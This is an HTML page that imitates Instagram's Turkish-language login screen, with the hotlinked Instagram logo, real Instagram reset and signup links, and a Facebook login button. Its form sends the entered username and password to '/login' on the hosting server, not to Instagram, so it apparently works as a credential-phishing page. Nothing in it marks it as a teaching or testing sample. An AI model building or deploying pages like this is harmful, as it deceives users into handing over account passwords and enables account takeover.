<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Instagram</title>
  <!-- Favicon -->
  <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-200.png/ab6eff595bb1.png" type="image/png" />
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Helvetica+Neue&display=swap');
    body {
      background: #fafafa;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
        Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .phone-frame {
      width: 375px;
      border: 1px solid #ddd;
      background: #fff;
      padding: 30px 40px 20px;
      box-shadow: 0 0 8px rgba(0,0,0,0.1);
      border-radius: 8px;
      text-align: center;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    img.logo {
      width: 175px;
      margin-bottom: 12px;
      user-select: none;
    }
    form {
      display: flex;
      flex-direction: column;
      width: 100%;
    }
    input[type="text"], input[type="password"] {
      padding: 12px 10px;
      margin-bottom: 8px;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background: #fafafa;
      font-size: 14px;
      width: 100%;
      box-sizing: border-box;
    }
    input::placeholder {
      color: #999;
    }
    button {
      margin-top: 10px;
      padding: 12px;
      background-color: #0095f6;
      border: none;
      border-radius: 3px;
      color: white;
      font-weight: 600;
      font-size: 14px;
      cursor: pointer;
      transition: background-color 0.3s ease;
      width: 100%;
    }
    button:hover {
      background-color: #0074d9;
    }
    .fb-login-btn {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      background-color: #fff;
      color: #262626;
      border: 1px solid #dbdbdb;
      font-weight: 600;
      padding: 10px 15px;
      border-radius: 6px;
      text-decoration: none;
      margin: 15px 0;
      font-size: 14px;
      cursor: pointer;
      user-select: none;
      box-shadow: 0 1px 2px rgb(0 0 0 / 0.1);
      transition: background-color 0.2s ease, box-shadow 0.2s ease;
      width: 100%;
      box-sizing: border-box;
    }
    .fb-login-btn:hover {
      background-color: #f7f7f7;
      box-shadow: 0 2px 4px rgb(0 0 0 / 0.15);
    }
    .fb-login-btn img {
      width: 18px;
      height: 18px;
      margin-right: 8px;
    }
    .links {
      margin: 15px 0;
      font-size: 12px;
      color: #00376b;
      text-align: left;
      width: 100%;
    }
    .links a {
      color: #00376b;
      text-decoration: none;
      font-weight: 600;
    }
    .links a:hover {
      text-decoration: underline;
    }
    .divider {
      margin: 20px 0;
      border-top: 1px solid #dbdbdb;
      width: 100%;
    }
    .footer-text {
      font-size: 12px;
      color: #999;
    }
  </style>
</head>
<body>
  <div class="phone-frame">
    <img
      class="logo"
      src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1200px-Instagram_logo_2016.svg.png"
      alt="Instagram Logo"
    />
    <form action="/login" method="POST">
      <input
        type="text"
        name="username"
        placeholder="Telefon, kullanıcı adı veya e-posta"
        required
      />
      <input type="password" name="password" placeholder="Şifre" required />
      <button type="submit">Giriş Yap</button>
    </form>

    <a href="https://www.facebook.com/login.php" class="fb-login-btn" target="_blank" rel="noopener noreferrer">
      <img
        src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_(2019).png"
        alt="Facebook Logo"
      />
      Facebook ile Giriş Yap
    </a>

    <div class="links">
      <a href="https://www.instagram.com/accounts/password/reset/">Şifreni mi unuttun?</a>
    </div>
    <div class="divider"></div>
    <div class="footer-text">
      Hesabın yok mu? <a href="https://www.instagram.com/accounts/emailsignup/">Kaydol</a>
    </div>
    <div class="footer-text" style="margin-top: 15px;">
    </div>
  </div>
</body>
</html>
